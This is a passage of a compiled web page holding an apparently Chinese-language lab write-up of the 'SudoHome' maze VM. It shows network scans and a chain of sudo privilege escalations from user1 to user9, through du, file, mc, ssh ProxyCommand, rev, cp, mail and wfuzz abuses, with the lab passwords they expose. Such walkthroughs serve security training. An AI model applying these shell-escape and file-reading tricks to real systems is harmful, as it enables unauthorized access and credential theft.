(window.webpackJsonp=window.webpackJsonp||[]).push([[155],{517:function(s,a,t){"use strict";t.r(a);var e=t(11),r=Object(e.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h2",{attrs:{id:"arp-扫描存活主机"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#arp-扫描存活主机"}},[s._v("#")]),s._v(" ARP 扫描存活主机")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" arp-scan "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-I")]),s._v(" eth1 "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.0/24\n     \n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.142  08:00:27:94:61:b4       "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("Unknown"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[s._v("目标主机 IP：192.168.56.142")]),s._v(" "),a("h2",{attrs:{id:"tcp-全端口扫描"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#tcp-全端口扫描"}},[s._v("#")]),s._v(" TCP 全端口扫描")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ nmap -p- "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-sT")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("192.168")]),s._v(".56.142\n\nPORT   STATE SERVICE\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("22")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("25")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  smtp\n"),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("80")]),s._v("/tcp "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v("  http\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br")])]),a("p",[s._v("开放了 22、25、80 端口")]),s._v(" "),a("h2",{attrs:{id:"_80-端口服务探测"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#_80-端口服务探测"}},[s._v("#")]),s._v(" 80 端口服务探测")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("┌──"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("npc㉿kali"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("-"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("~"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n└─$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("curl")]),s._v(" http://192.168.56.142\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("<")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("-- try "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("ssh")]),s._v(" --"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(">")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("p",[s._v("常规扫描没有发现有用信息，看到提示 try ssh，尝试 ssh 登录")]),s._v(" "),a("h2",{attrs:{id:"user1"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user1"}},[s._v("#")]),s._v(" user1")]),s._v(" "),a("p",[s._v("提示使用ssh，尝试 ssh 登录root，ssh banner信息里留了一个user1")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/1.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/2.png",alt:""}})]),s._v(" "),a("blockquote",[a("p",[s._v("user1 : 0woA8Sr7I83R0ZwmnTcH")])]),s._v(" "),a("p",[s._v("家目录有10个用户，每个用户目录下有一个password.txt文件")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/3.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"user2-du-读取文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user2-du-读取文件"}},[s._v("#")]),s._v(" user2 du 读取文件")]),s._v(" "),a("p",[s._v("user1用户可以无密码使用 user2 的 du 命令，--help看看帮助")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/4.png",alt:""}})]),s._v(" "),a("p",[s._v("其中的"),a("code",[s._v("--files0-from=F")]),s._v("参数是为了解决文件名中包含空格的问题，文件名以ASCII NUL字符（即\\0）分隔的问题，可以从文件F中读取文件名列表")]),s._v(" "),a("p",[s._v("当 password.txt 中的内容被当作“文件名”，而这些文件名又实际不存在时，du 在报错时会把这些“文件名”完整打印出来，等于把 password.txt 暴露了。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user1@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" user2 /usr/bin/du --files0-from"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("/home/user2/password.txt\n/usr/bin/du: cannot access "),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("'tLPi3BLMG2zmwvZ5z9rh'")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("$'"),a("span",{pre:!0,attrs:{class:"token entity",title:"\\n"}},[s._v("\\n")]),s._v("'")]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" No such "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" or directory\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("blockquote",[a("p",[s._v("user2 : tLPi3BLMG2zmwvZ5z9rh")])]),s._v(" "),a("h2",{attrs:{id:"user3-file-读取文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user3-file-读取文件"}},[s._v("#")]),s._v(" user3 file 读取文件")]),s._v(" "),a("p",[s._v("user2用户可以无密码使用 user3 的 file 命令，-f参数是从文件中读取文件名列表")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/5.png",alt:""}})]),s._v(" "),a("p",[s._v("可以在 gtfobins 上找到利用方法 "),a("a",{attrs:{href:"https://gtfobins.github.io/gtfobins/file/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://gtfobins.github.io/gtfobins/file/"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/6.png",alt:""}})]),s._v(" "),a("p",[s._v("使用 file -f /home/user3/password.txt 时，file 会把文件中的每一行当作文件名；不存在的文件在报错信息中被原样打印出来，从而泄露密码内容。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user2@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" user3 /usr/bin/file "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" /home/user3/password.txt \nTFqxDyfGO69DP1lyjt0f: cannot "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("open")]),s._v(" `TFqxDyfGO69DP1lyjt0f' "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("No such "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("file")]),s._v(" or directory"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("blockquote",[a("p",[s._v("user3 : TFqxDyfGO69DP1lyjt0f")])]),s._v(" "),a("h2",{attrs:{id:"user4-mc-getshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user4-mc-getshell"}},[s._v("#")]),s._v(" user4 mc getshell")]),s._v(" "),a("p",[s._v("user3用户可以无密码使用 user4 的 mc 命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/7.png",alt:""}})]),s._v(" "),a("p",[s._v("mc 命令可以进入子shell或编辑文件")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/8.png",alt:""}})]),s._v(" "),a("p",[s._v("-U 直接启动 subshell，这里通过 sudo 以 user4 身份启动 subshell，从而获得 user4 的交互 shell。")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user3@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" user4 /usr/bin/mc "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-U")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/9.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/10.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user4@SudoHome:/home/user3$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("whoami")]),s._v("\nuser4\n\nuser4@SudoHome:/home/user3$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /home/user4/password.txt\nB0aWh2XHpp5hOIVtCUbn\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br")])]),a("blockquote",[a("p",[s._v("user4 : B0aWh2XHpp5hOIVtCUbn")])]),s._v(" "),a("h2",{attrs:{id:"user5-ssh-getshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user5-ssh-getshell"}},[s._v("#")]),s._v(" user5 ssh getshell")]),s._v(" "),a("p",[s._v("user4用户可以无密码使用 user5 的 ssh 命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/11.png",alt:""}})]),s._v(" "),a("p",[s._v("gtfobins 上有利用方法 "),a("a",{attrs:{href:"https://gtfobins.github.io/gtfobins/ssh/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://gtfobins.github.io/gtfobins/ssh/"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/12.png",alt:""}})]),s._v(" "),a("p",[s._v("ssh 进入 user5 的shell")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user4@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" user5 /usr/bin/ssh "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-o")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("ProxyCommand")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string"}},[s._v("';bash 0<&2 1>&2'")]),s._v(" x\nuser5@SudoHome:/home/user4$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("id")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("uid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1004")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("user5"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("gid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1004")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("user5"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("groups")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1004")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("user5"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nuser5@SudoHome:/home/user4$\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br")])]),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/13.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user5@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" password.txt \nGZ5KErjFycaYHZGj7GcI\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("blockquote",[a("p",[s._v("user5 : GZ5KErjFycaYHZGj7GcI")])]),s._v(" "),a("h2",{attrs:{id:"user6-rev-读取文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user6-rev-读取文件"}},[s._v("#")]),s._v(" user6 rev 读取文件")]),s._v(" "),a("p",[s._v("user5用户可以无密码使用 user6 的 rev 命令")]),s._v(" "),a("p",[s._v("rev命令可以直接逆序打印文件内容，逆序两次就正回来了")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user5@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" user6 /usr/bin/rev /home/user6/password.txt"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("|")]),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("rev")]),s._v("\nLowGbJGVAxhQw63UWc5Z\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br")])]),a("blockquote",[a("p",[s._v("user6 : LowGbJGVAxhQw63UWc5Z")])]),s._v(" "),a("h2",{attrs:{id:"user7-cp-读取文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user7-cp-读取文件"}},[s._v("#")]),s._v(" user7 cp 读取文件")]),s._v(" "),a("p",[s._v("user6用户可以无密码使用 user7 的 cp 命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/14.png",alt:""}})]),s._v(" "),a("p",[s._v("user7 的 .profile 是可读的状态，把password.txt 复制过去就可以读取了")]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user6@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" user7 /usr/bin/cp /home/user7/password.txt /home/user7/.profile\nuser6@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" /home/user7/.profile\nHLoKAOu86miWIYKdyVx3\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br")])]),a("blockquote",[a("p",[s._v("user7 : HLoKAOu86miWIYKdyVx3")])]),s._v(" "),a("p",[s._v("还可以通过 "),a("code",[s._v("/dev/tty")]),s._v("，"),a("code",[s._v("/dev/tty")]),s._v(" 是当前终端设备文件，会直接输出到当前终端")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/29.png",alt:""}})]),s._v(" "),a("h2",{attrs:{id:"user8-mail-getshell"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user8-mail-getshell"}},[s._v("#")]),s._v(" user8 mail getshell")]),s._v(" "),a("p",[s._v("user7用户可以无密码使用 user8 的 mail 命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/15.png",alt:""}})]),s._v(" "),a("p",[s._v("gtfobins 里可以找到相关利用姿势，可以通过 mail 命令的交互式shell执行命令，"),a("a",{attrs:{href:"https://gtfobins.github.io/gtfobins/mail/",target:"_blank",rel:"noopener noreferrer"}},[s._v("https://gtfobins.github.io/gtfobins/mail/"),a("OutboundLink")],1)]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/16.png",alt:""}})]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/17.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user7@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("touch")]),s._v(" /tmp/111\nuser7@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" user8 /usr/bin/mail "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-f")]),s._v(" /tmp/111\nMail version "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("8.1")]),s._v(".2 01/15/2001.  Type ? "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" help.\n"),a("span",{pre:!0,attrs:{class:"token string"}},[s._v('"/tmp/111"')]),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v(" messages "),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("[")]),s._v("Read only"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("]")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("&")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("!")]),s._v("/bin/bash\nuser8@SudoHome:/home/user7$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("id")]),s._v("\n"),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("uid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1007")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("user8"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("gid")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1007")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("user8"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token assign-left variable"}},[s._v("groups")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1007")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v("(")]),s._v("user8"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(")")]),s._v("\nuser8@SudoHome:/home/user7$ "),a("span",{pre:!0,attrs:{class:"token builtin class-name"}},[s._v("cd")]),s._v("\nuser8@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("cat")]),s._v(" password.txt \nUxeGoUq8xqBRxyWVQPYK\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br")])]),a("blockquote",[a("p",[s._v("user8 : UxeGoUq8xqBRxyWVQPYK")])]),s._v(" "),a("h2",{attrs:{id:"user9-wfuzz-读取文件"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#user9-wfuzz-读取文件"}},[s._v("#")]),s._v(" user9 wfuzz 读取文件")]),s._v(" "),a("p",[s._v("user8用户可以无密码使用 user9 的 wfuzz 命令")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/18.png",alt:""}})]),s._v(" "),a("p",[s._v("将 /home/user9/password.txt 作为 wfuzz 的字典文件，文件中的一行内容会作为 FUZZ 的 payload， wfuzz 会在输出表格的 Payload 列里原样打印这一行，从而泄露密码。")]),s._v(" "),a("p",[a("img",{attrs:{src:"/medias/maze-sudohome/19.png",alt:""}})]),s._v(" "),a("div",{staticClass:"language-bash line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-bash"}},[a("code",[s._v("user8@SudoHome:~$ "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("sudo")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-u")]),s._v(" user9 /usr/bin/wfuzz "),a("span",{pre:!0,attrs:{class:"token parameter variable"}},[s._v("-w")]),s._v(" /home/user9/password.txt http://127.0.0.1/FUZZ\n /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation "),a("span",{pre:!0,attrs:{class:"token keyword"}},[s._v("for")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token function"}},[s._v("more")]),s._v(" information.\n********************************************************\n* Wfuzz "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("3.1")]),s._v(".0 - The Web Fuzzer                         *\n********************************************************\n\nTarget: http://127.0.0.1/FUZZ\nTotal requests: "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1")]),s._v("\n\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("\nID           Response   Lines    Word       Chars       Payload\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("==")]),a("span",{pre:!0,attrs:{class:"token 